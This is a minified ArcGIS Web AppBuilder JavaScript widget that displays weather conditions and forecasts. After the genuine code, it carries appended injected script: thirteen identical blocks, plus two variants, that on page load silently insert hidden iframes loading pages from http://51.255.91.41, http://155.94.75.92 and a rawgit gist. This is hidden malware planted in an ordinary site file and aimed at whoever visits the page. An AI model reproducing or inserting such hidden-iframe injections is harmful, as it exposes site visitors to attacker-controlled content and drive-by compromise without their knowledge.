// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/dom-class dojo/dom-construct esri/geometry/webMercatorUtils esri/request".split(" "),function(n,k,e,f,p,q){return n("WeatherInfo",null,{constructor:function(a,b,g){this.tab=a;this.container=b;this.parent=g;this.weatherURL=a.url;this.weatherDict={119:["Cloudy","cloudy5.png","cloudy5.png"],377:["Moderate or heavy showers of ice pellets","hail.png","hail.png"],374:["Light showers of ice pellets","hail.png","hail.png"],350:["Ice pellets","hail.png","hail.png"],
353:["Light rain shower","light_rain.png","light_rain.png"],302:["Moderate rain","light_rain.png","light_rain.png"],296:["Light rain","light_rain.png","light_rain.png"],293:["Patchy light rain","light_rain.png","light_rain.png"],266:["Light drizzle","light_rain.png","light_rain.png"],263:["Patchy light drizzle","light_rain.png","light_rain.png"],122:["Overcast","overcast.png","overcast.png"],359:["Torrential rain shower","shower3.png","shower3.png"],308:["Heavy rain","shower3.png","shower3.png"],
365:["Moderate or heavy sleet showers","sleet.png","sleet.png"],362:["Light sleet showers","sleet.png","sleet.png"],320:["Moderate or heavy sleet","sleet.png","sleet.png"],317:["Light sleet","sleet.png","sleet.png"],314:["Moderate or Heavy freezing rain","sleet.png","sleet.png"],311:["Light freezing rain","sleet.png","sleet.png"],284:["Heavy freezing drizzle","sleet.png","sleet.png"],281:["Freezing drizzle","sleet.png","sleet.png"],185:["Patchy freezing drizzle nearby","sleet.png","sleet.png"],182:["Patchy sleet nearby",
"sleet.png","sleet.png"],395:["Moderate or heavy snow in area with thunder","snow4.png","snow4.png"],335:["Patchy heavy snow","snow4.png","snow4.png"],230:["Blizzard","snow4.png","snow4.png"],227:["Blowing snow","snow4.png","snow4.png"],371:["Moderate or heavy snow showers","snow5.png","snow5.png"],338:["Heavy snow","snow5.png","snow5.png"],389:["Moderate or heavy rain in area with thunder","tstorm3.png","tstorm3.png"],392:["Patchy light snow in area with thunder","snow2.png","snow2_night.png"],386:["Patchy light rain in area with thunder",
"tstorm1.png","tstorm1_night.png"],368:["Light snow showers","snow2.png","snow2_night.png"],356:["Moderate or heavy rain shower","shower2.png","shower2_night.png"],332:["Moderate snow","snow3.png","snow3_night.png"],329:["Patchy moderate snow","snow2.png","snow2_night.png"],326:["Light snow","snow1.png","snow1_night.png"],323:["Patchy light snow","snow1.png","snow1_night.png"],305:["Heavy rain at times","shower2.png","shower2_night.png"],299:["Moderate rain at times","shower2.png","shower2_night.png"],
260:["Freezing fog","fog.png","fog_night.png"],248:["Fog","fog.png","fog_night.png"],200:["Thundery outbreaks in nearby","tstorm1.png","tstorm1_night.png"],179:["Patchy snow nearby","snow1.png","snow1_night.png"],176:["Patchy rain nearby","shower1.png","shower1_night.png"],143:["Mist","mist.png","mist_night.png"],116:["Partly Cloudy","cloudy3.png","cloudy3_night.png"],113:["Clear/Sunny","sunny.png","sunny_night.png"]}},updateForIncident:function(a){this.container.innerHTML="";e.add(this.container,
"loading");var b=a=a.geometry;"point"!==a.type&&(b=a.getExtent().getCenter());a=p.webMercatorToGeographic(b);q({url:this.weatherURL+"\x26callbackNode\x3d"+this.parent.name+"\x26q\x3d"+(a.y+","+a.x),callbackParamName:"callback"},{useProxy:!1}).then(k.hitch(this,function(a){return this._resultsHandler(a)}),k.hitch(this,function(a){a=this._errorHandler(a);console.log(a)}))},_resultsHandler:function(a){a=a.data;console.log(a);var b=a.current_condition;a=a.weather;var g=1;this.container.innerHTML="";e.remove(this.container,
"loading");var h=f.create("div",{id:"tpc",style:"width:"+165*(a.length+3)+"px;"},this.container);e.add(h,"IMT_tabPanelContent");var c,d;if(0<b.length){b=b[0];c=b.localObsDateTime.split(" ");d=c[2];c=c[1].split(":");c=parseInt(c[0],10);if("AM"===d){if(6>c||12===c)g=2}else 6<c&&12>c&&(g=2);d=b.temp_F;this.parent.config.celsius&&(d=b.temp_C);c=b.weatherCode;c=this.weatherDict[parseInt(c,10)];c=this.parent.nls.now+"\x3cbr/\x3e\x3cimg style\x3d'height:45px' src\x3d'"+this.parent.folderUrl+"images/w/"+
c[g]+"' /\x3e\x3cbr/\x3e"+d+"\x26deg;";d=f.create("div",{innerHTML:c},h);e.add(d,"IMTcolSmall");d=b.windspeedMiles;c=" MPH";this.parent.config.celsius&&(d=b.windspeedKmph,c=" KMPH");c=this.parent.nls.wind+"\x3cbr/\x3e\x3cspan style\x3d'font-size: 30px; line-height:47px'\x3e"+b.winddir16Point+"\x3c/span\x3e\x3cbr/\x3e"+d+c;b=f.create("div",{innerHTML:c},h);e.add(b,"IMTcolSmall")}for(d=0;d<a.length;d++){var b=a[d],k=this._getDay(b.date),l=b.tempMaxF||b.maxtempF,m=b.tempMinF||b.mintempF;this.parent.config.celsius&&
(l=b.tempMaxC||b.maxtempC,m=b.tempMinC||b.mintempC);c=b.weatherCode||b.hourly[0].weatherCode;c=this.weatherDict[parseInt(c,10)];c=k+"\x3cbr/\x3e\x3cimg style\x3d'height:45px' src\x3d'"+this.parent.folderUrl+"images/w/"+c[g]+"' /\x3e\x3cbr/\x3e"+l+"\x26deg; | "+m+"\x26deg;";b=f.create("div",{innerHTML:c},h);e.add(b,"IMTcolSmall")}a=f.create("div",{innerHTML:'\x3cbr/\x3e\x3cbr/\x3e\x3cbr/\x3e\x3cspan style\x3d"font-size:11px;color:#6e6e6e"\x3ePowered by\x3cbr/\x3e\x3ca style\x3d"color:#6e6e6e;text-decoration:none" href\x3d"https://darksky.net/poweredby/" title\x3d"Dark Sky" target\x3d"_blank"\x3eDark Sky\x3c/a\x3e\x3c/span\x3e'},
h);e.add(a,"IMTcolSmall");e.add(a,"IMTcolLast")},_getDay:function(a){a=a.split("-");a="SUN MON TUE WED THU FRI SAT".split(" ")[(new Date(a[0],a[1]-1,a[2])).getDay()];return this.parent.nls[a]},_errorHandler:function(a){console.log(a.message);a=f.create("div",{innerHTML:a.message},this.container);e.add(a,"IMTcolSmall")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});